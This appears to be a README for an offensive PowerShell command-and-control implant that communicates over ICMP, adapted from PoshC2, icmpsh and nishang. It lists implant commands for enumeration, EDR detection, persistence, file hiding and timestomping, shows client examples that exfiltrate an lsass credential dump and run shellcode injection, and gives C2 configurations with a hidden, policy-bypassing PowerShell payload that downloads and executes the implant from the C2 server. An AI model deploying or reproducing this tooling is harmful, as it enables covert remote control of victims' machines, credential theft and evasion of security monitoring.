#### Most of this code is borrowed from or inspired by various sources. Credit goes to:
```txt
https://github.com/inquisb/icmpsh
https://github.com/nettitude/PoshC2
https://github.com/samratashok/nishang
```

## Description:
```txt
A port of PoshC2 using ICMP with authentication and fallback channels as a list of IPs or subnets to avoid hardcoding IPs.

Note: disable ICMP echo request using "ssysctl -w net.ipv4.icmp_echo_ignore_all=1"
```

### C2 Commands:
```ps1
# Fallback related options  
SetFallbackIPs [String[]]$IPs
SetFallbackNetwork [String]$IPAddress [String]$subnetMask
GetSubnet [String]$IPAddress [String]$fallbackCIDR

# Host enumeration options
TestWin32
TestWin64
TestWow64
CheckArchitecture
GetProxy
CheckVersionTwo
TestAdministrator
GetProcess
GetProcessFull
InvokeNetstat
GetAllServices
GetAllFirewallRules
InvokeEDRChecker
GetUserInfo
GetComputerInfo
Survey

# Persistence options 
StartAnotherImplant
InvokeDowngradeAttack
CreateShortcut [String]$SourceExe [String]$ArgumentsToSourceExe [String]$DestinationPath
EnableRDP
DisableRDP
WriteSCFFile [String]$IPaddress [String]$Location
WriteINIFile [String]$IPaddress [String]$Location
InstallPersistence [Int]$Method
InstallExePersistence
RemoveExePersistence
CheckWMI
RemoveWMIPersistence [String]$EventFilterName [String]$EventConsumerName
InstallWMIPersistence [String]$EventFilterName [String]$EventConsumerName
RemovePersistence [Int]$Method
EnableWinRM [string]$username [string]$password [string]$computer
DisableWinRM [string]$username [string]$password [string]$computer

# File transfer options
DownloadFile [String]$SourceURL[String]$TargetFilePath
DownloadString [string]$url

# File system options
EncryptFile [String]$key [String]$source [String]$destination
DecryptFile [String]$key [String]$source [String]$destination
Unzip [String]$SourceFile [String]$Destination
ConvertFromBase64 [string]$SourceFilePath [string]$TargetFilePath
SecureDelete [string]$Destination
UnHideFile [String]$file
HideFile [String]$file
TimeStomp [String]$path, [DateTime]$stamp

# Command options
WMICommand [string]$username [string]$password [string]$computer [string]$command

# Crypto options
CreateKey
EncryptString [String]$key [String]$unencryptedString
DecryptString [String]$key [String]$encryptedStringWithIV

# Show commands...
Help
```

### Client commands:
```txt
# icmp_client.py
put_file source destination
get_file source destination
invoke_file source destination
auth password
```

### Examples:
```txt
# icmp_client.py
Upload file: put_file /tmp/nc.exe c:/temp/nc.exe
Download file: get_file c:/temp/lsass.dmp /tmp/lsass.dmp
Invoke file: invoke_file /tmp/InjectShellcode.ps1
Authenticate: auth P@ssword!
```

### Default C2 configuration:
```ps1
# icmp_server.ps1
$c2Server = "10.49.117.253"; # default C2 server
#$password = "PWN"; # using a password/key requires auth
$password = ""; # blank password doesn't require auth
$psVersion = $PSVersionTable.psversion.Major; # hacky way of setting PS version
#$payload = "powershell -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('https://$($c2Server)/icmp_server.ps1'))";
$payload = "powershell -exec bypass -noninteractive -windowstyle hidden -c iex(gc C:\windows\temp\icmp_server.ps1|out-string)";
$shell = [ICMPShell]::New($c2Server, $password, $PID, $psVersion, $payload);
# start the C2 server:
$shell.InvokeShell();
```

### Fallback network configuration:
```ps1
# icmp_server.ps1
$networkAddress = "10.49.117.244"; # network or host IP
$networkMask = "255.255.254.0";    # subnet mask to calculate fallback IPs
$shell.SetFallbackCIDR($networkAddress, $networkMask); # sets the fallback IPs
```

### Fallback IP list configuration:
```ps1
# icmp_server.ps1 or icmp_basic_server.ps1
$c2Servers = @("10.49.117.253", "10.49.117.252", "10.49.117.251"); # pass an array of IPs
$shell.SetFallbackIPs($c2Servers); # sets the fallback IPs
```

### Basic C2 configuration:
```ps1
# icmp_basic_server.ps1
$c2Server = "10.49.117.253"; # default C2 server
#$password = "PWN"; # using a password/key requires auth
$password = ""; # blank password doesn't require auth
$shell = [ICMPShell]::New($c2Server, $password);

# fallback IP list configuration:
$c2Servers = @("10.49.117.253", "10.49.117.252", "10.49.117.251"); # pass an array of IPs
$shell.SetFallbackIPs($c2Servers); # sets the fallback IPs

# start the C2 server:
$shell.InvokeShell();
```
